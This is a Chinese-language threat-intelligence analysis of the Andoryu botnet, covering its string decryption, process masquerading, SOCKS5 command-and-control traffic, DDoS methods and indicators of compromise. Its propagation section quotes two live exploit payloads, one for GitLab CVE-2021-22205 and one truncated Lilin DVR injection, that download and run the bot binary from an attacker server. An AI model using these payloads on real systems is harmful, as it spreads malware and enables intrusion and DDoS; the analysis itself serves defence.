---
title: Andoryu Botnet—基于Socks协议通信的新型僵尸网络
url: https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247505434&idx=1&sn=8a2b307d9cd8617584fc838f4ddb67db&chksm=ea66216ddd11a87b2c02c5e7a69f8b4e69b7860e2b23c6c9df5efdaa0405034f97fc4f8f219c&scene=58&subscene=0#rd
source: 奇安信威胁情报中心
date: 2023-02-21
fetch_date: 2025-10-04T07:37:47.787085
---

# Andoryu Botnet—基于Socks协议通信的新型僵尸网络

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2AqAgxkehicicWeZN5qxRdAnHlJQTLlBmVHibCDTWpooEZH3ok3fg8hBJmeltyJTOGsUAGTHFYr8CDPbXIVu26Zdg/0?wx_fmt=jpeg)

# Andoryu Botnet—基于Socks协议通信的新型僵尸网络

原创

威胁情报中心

奇安信威胁情报中心

1. 概述

2023 年 2月初，奇安信威胁情报中心威胁监控系统监测到一起未知家族恶意样本利用CVE-2021-22205漏洞传播的事件，经过分析确认该样本不属于已知的僵尸网络家族。

通过样本编写者对其僵尸网络的命名，我们将此新型僵尸网络称为Andoryu Botnet，该新型僵尸网络通过Socks5协议与C2进行通信。

Andoryu Botnet 最近传播趋势如下，通过其活跃时间点我们得知Andoryu Botnet当前仅在样本进行更新迭代的时间点前后进行小范围传播，因此可以判断该僵尸网络还处于测试阶段：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxzjPFGtTKQDRAfAm0OicHQwT5kZ3OUKEFKcfvV87ThfO6VsWYxiaHduibQ/640?wx_fmt=png)

2. 样本关键行为分析

本文以 x86-64 样本为例进行分析，样本信息：

|  |  |  |
| --- | --- | --- |
| 文件名 | 文件大小 | 文件MD5 |
| Andoryu.x86 | 42208 bytes | D203E1BB0BA3E8385FF9E1F83C10EB2D |

**2.1 运行参数判定**

运行时会首先判断是否存在参数，当存有一个参数时样本才会正常运行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxzVVLicqjc5LRibwCsBCJdP5f7K9Deo92icokic0YrlvuOk3RapiadE1wuag/640?wx_fmt=png)

**2.2 字符串加密**

样本中的大部分关键字符串加密，运行前期通过一个函数对所有加密的字符串进行批量解密：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxJbvR4rAXZz7KW8bFHwRN4NrgBuFJXh24uohiaiazR1UKlVG6wtvvImhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxuibcW1IZznyOLfmSibjweuKwBKjDvxFlZzEoQH9ic81ib2KrCtHZuGfziaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxSibuDpOfJV3SEyOAIqn1fosZIrr6AU6prjnYiavocicOGJ6ic9BE3kpRXQ/640?wx_fmt=png)

**2.3 进程名伪装**

使用 prctl 函数将进程名修改为 "/bin/bash"：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxianflMM4eTZd7Whu4q2SiadVQn4FwQLZUHVaYBTg6G8QwXAreFfYlh7g/640?wx_fmt=png)

**2.4 打印僵尸网络信息**

解密后的字符串中存在该僵尸网络信息，样本运行时将其打印到控制台：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cx9RD1TD45G8tsGy2EGr8ssqiasLSJeJU7utYXNZF7iaHsLyEstf6hcLJQ/640?wx_fmt=png)

由此命名该僵尸网络为Andoryu Botnet，并且可以了解到编写者测试样本的时间为2022年12月30日。

3. Socks5通信

**3.1 通信过程**

该僵尸网络通过socks协议进行通信，具体通信过程如下：

一、首先连接硬编码的代理服务器，代理服务器地址为 "152.67.66.37:1080"。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cx52fTILlxiaDaupiax1aQaX8Uqv8Qiaib62xL4uh4gWF3BZWoZKklI2NicAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxdxb0X6snXxWRV8R8czxUNOVNlkf8BqBPiaibOyoAVoAub4uTPV5eNoKA/640?wx_fmt=png)

二、与代理服务器成功三次握手后进行socks认证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxDR3n5thkWsbIOeg8tIUz8lsbPd85ERR7J3CfxP5aSHkUZHibHibGMhFA/640?wx_fmt=png)

采用无用户密码认证的socks5代理：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxcn7Z4uzU5MicicGW05BtyzNsuibIEE6lGXK5WeVVL6R9dIJyrFgyFl2Fw/640?wx_fmt=png)

三、告知代理服务器需要访问哪个远程服务器，远程服务器地址批量解密时获取，DST\_C2 = "172.86.123.20:1025"。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxS4VjicnUicTPhmiaCcJNazKwednf5jLgzDm6D7tkYia0QFjABcWLntsKPQ/640?wx_fmt=png)

四、socks通信，发送上线包。

上线包数据中包含本机IP信息：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxAib49d0akbdkcnliblDlCibU1IbsKpZMeFL1H3JnwnesRcnvBX5T6KBZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxibbXzGcIfibcXuVd3ZC2CYxZUD8C1mpriblbffKQe1VNuDl6ja8mrgcYQ/640?wx_fmt=png)

五、通过代理接收C2下发指令。

奇安信威胁情报中心当前已监控到下发数据，但攻击者暂时还未发出DDoS攻击指令：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxYdiclXg2dKT5kTHUFlia5GAR02cRmmzuM88LMSXial1DAtd9aXzAQ6emw/640?wx_fmt=png)

后续我们将持续对Andoryu Botnet进行跟踪并公布其最新动态。

**3.2 DDoS方法**

AndoryuBot支持多种DDoS方法，具体如下：

|  |  |
| --- | --- |
| **Name** | **Description** |
| icmp-echo | ICMP Flood |
| udp-ovh | UDP Flood for OVH |
| udp-game | UDP Game Flood |
| udp-plain | UDP Plain Flood |
| tcp-raw | TCP Flood |
| tcp-socket | TCP Syn Flood |
| tcp-handshake | TCP Flood |

4. 样本更新及传播

通过对样本的关联分析，Andoryu Botnet更新始于2022年12月份，期间进行过两次更新迭代，更新时作者并未将样本中的输出测试时间进行修改，更新内容主要是DST\_C2地址及支持的架构，最新版本AndoryuBot支持的CPU架构如下：

* Arm
* Mips
* M68K
* SuperH
* Sparc
* x86

Andoryu Botnet的传播方式除了CVE-2021-22205外，还通过Lilin DVR RCE进行扩散，本次发现的Payload如下：

**CVE-2021-22205：**

```
P(metadata.(Copyright "\" . qx{TF=$(mktemp -u);mkfifo $TF && rm -rf Andoryu.10wget;wget http://47.87.154.192/Andoryu.x86 -O Andoryu.10wget;chmod 777 Andoryu.10wget;./Andoryu.10wget gitlab.x86;rm -rf Andoryu.10wget;<$TF | sh 1>$TF} . \" b ") )
```

**Lilin DVR RCE：**

```
User-Agent: Abcd<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&cd /tmp;wget -O-
```

5. IoCs

**MD5:**

D203E1BB0BA3E8385FF9E1F83C10EB2D

28F10E60D05018E6D28B79F0976A8542

F9018E4401116435DCFE2DC9D14D0FD5

2BABAF24B23872749EEC1452D7E7C0F3

ABD2496C3B703BD722386A848CC0BC12

6335ECB85ED6C6FCCF71FD841939BEC4

70A568C47785A8C58AA1D755EFE0E39E

FFE05160D769F441EF4A67271F9E614C

BB7DECCC2F6CEB2D5A5C7F5A05A4BBB1

0A1B14C2B8A453323841431FA44D0E32

C9CE8E0A1B13CBB6719133AFE5988CA7

**C&C:**

152.67.66.37:1080

172.86.123.20: 1025

104.234.239.190:1025

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/2AqAgxkehicibX8LtqB0ib3OdmGDlvCW6cxBEcZ9FoptK7H7FC1yO01nPLzWiahXRuUkwug8sZsNzp6ujFWvQ14LCA/640?wx_fmt=gif)

点击阅读原文至**ALPHA 6.0**

即刻助力威胁研判

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

奇安信威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过